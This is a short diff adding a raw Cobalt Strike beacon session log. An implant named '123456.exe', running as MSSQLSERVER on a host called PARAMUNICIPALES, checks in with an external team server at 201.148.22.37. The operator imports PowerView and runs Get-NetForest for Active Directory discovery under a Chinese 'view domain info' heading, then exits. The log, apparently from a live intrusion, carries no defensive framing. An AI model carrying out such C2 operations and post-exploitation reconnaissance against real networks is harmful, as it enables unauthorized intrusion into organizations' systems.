@@ -1,0 +1,10 @@
+12/01 12:38:56 UTC [metadata] 201.148.22.37 <- 192.168.9.50; computer: PARAMUNICIPALES; user: MSSQLSERVER; process: 123456.exe; pid: 7824; os: Windows; version: 6.2; build: 9200; beacon arch: x86 (x64)
+12/01 12:40:24 UTC [output]
+9=========== 查看域信息 ==========
+
+12/01 12:40:25 UTC [task] <T1086, T1064> Tasked beacon to import: C:\Users\Yinsel\Desktop\Tools\CobaltStrike4.8\Script\OLa\scripts\discovery-tools\Powerview.ps1
+12/01 12:40:25 UTC [task] <T1086, T1093> Tasked beacon to run: Get-NetForest (unmanaged)
+12/01 12:40:47 UTC [input] <y> exit
+12/01 12:40:47 UTC [task] <> Tasked beacon to exit
+12/01 12:40:56 UTC [metadata] 201.148.22.37 <- 192.168.9.50; computer: PARAMUNICIPALES; user: MSSQLSERVER; process: 123456.exe; pid: 7824; os: Windows; version: 6.2; build: 9200; beacon arch: x86 (x64)
+12/01 12:40:52 UTC [checkin] host called home, sent: 281129 bytes
